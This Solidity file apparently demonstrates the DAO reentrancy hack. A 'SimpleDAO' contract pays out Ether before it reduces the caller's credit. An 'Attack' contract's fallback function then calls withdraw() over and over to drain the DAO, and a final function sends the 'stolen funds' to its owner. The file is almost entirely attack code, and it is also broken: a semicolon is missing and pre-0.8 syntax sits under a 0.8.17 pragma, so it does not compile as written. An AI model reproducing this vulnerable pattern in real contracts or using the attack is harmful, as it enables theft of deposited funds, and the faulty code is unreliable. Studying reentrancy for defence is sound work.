pragma solidity ^0.8.17;

contract SimpleDAO {
    mapping(address => uint) public credit;

    function donate(address to) payable public {
        credit[to] += msg.value
    }

    function withdraw(uint amount) public {
        if(credit[msg.sender] >= amount) {
            require(msg.sender.call.value(amount));
            credit[msg.sender] -= amount;
        }
    }

    function queryEdit(address to) view public {
        return credit[to];
    }
}

////////// C A U T I O N //////////

contract Attack {
    SimpleDAO public dao;
    address public owner;

    constructor(address _dao) public {
        dao = SimpleDAO(_dao);
        owner = msg.sender;
    }

    // function starts attack sending donate to itself
    function attack() public payable {
        require(msg.value >= 1 ether); // depost funds
        dao.donate.value(msg.value)(address(this));
        dao.withdraw(msg.value); // start attack
    }

    // fallback fn, called while received ETH
    function () external payable {
        if (address(dao).balance > 0) {
            dao.withdraw(1 ether); // call withdraw() again
        }
    }

    function withdrawStolenFunds() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}